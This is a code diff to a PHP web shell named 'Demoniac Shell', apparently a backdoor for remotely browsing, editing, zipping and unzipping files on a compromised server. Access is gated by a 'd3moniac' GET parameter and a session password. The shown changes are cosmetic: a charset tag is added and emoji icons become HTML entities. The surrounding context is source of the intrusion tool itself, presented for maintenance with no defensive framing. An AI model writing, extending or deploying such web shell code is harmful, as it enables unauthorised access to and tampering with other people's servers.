@@ -127,11 +127,12 @@ if(!isset($_GET['d3moniac']) && !isset($_SESSION['auth']) && $_SESSION['auth'] !
         }
     </style>
     <head>
+        <meta charset="UTF-8">
         <title>hell</title>
     </head>
     <body>
         <div style="position:fixed;top:0;left:0;background-image: linear-gradient(0deg, #3B0000, black);width:100%;height:100%;z-index:-99;"></div>
-        <h1 style="text-align: center; text-shadow: 0px 0px 6px red;"><a href="<?php echo $_SERVER['SCRIPT_NAME'];?>">⛧ Demoniac Shell ⛧</a></h1>
+        <h1 style="text-align: center; text-shadow: 0px 0px 6px red;"><a href="<?php echo $_SERVER['SCRIPT_NAME'];?>">&#x26E7; Demoniac Shell &#x26E7;</a></h1>
         <?php
             if(!isset($_SESSION['auth']) && $_SESSION['auth'] != md5(crypt($_POST['pass'], $pass_salt))){
         ?>
@@ -357,23 +358,23 @@ if(!isset($_GET['d3moniac']) && !isset($_SESSION['auth']) && $_SESSION['auth'] !
                                 (($perms & 0x0200) ? 'T' : '-'));
 
                     if(is_dir($file)){
-                        $size = "✖️";
+                        $size = "&#x2716;";
                         $class = "submit_dir";
                         $exclusive_action = "<input type='submit' name='zip' value='Zip '/>";
-                        $emoji = "🖿";
+                        $emoji = "&#x1F5BF;";
                         $empty = ((count(glob("$file/*")) === 0) ? true : false);
                         if($empty){
-                            $emoji = "🗀";
+                            $emoji = "&#x1F5C0;";
                         }
                         if($file == '..'){
-                            $emoji = "↩";
+                            $emoji = "&#x21A9;";
                         }
                     }
                     elseif(is_file($file)){
                         $size = convertByte(filesize($file));
                         $class = "submit_file";
                         $exclusive_action = "<input type='submit' name='edit' value='Edit'/>";
-                        $emoji = "🗅";
+                        $emoji = "&#x1F5C5;";
                         if(pathinfo($file, PATHINFO_EXTENSION) == "zip"){
                             $exclusive_action .= "|<input type='submit' name='unzip' value='Unzip' />";
                         }
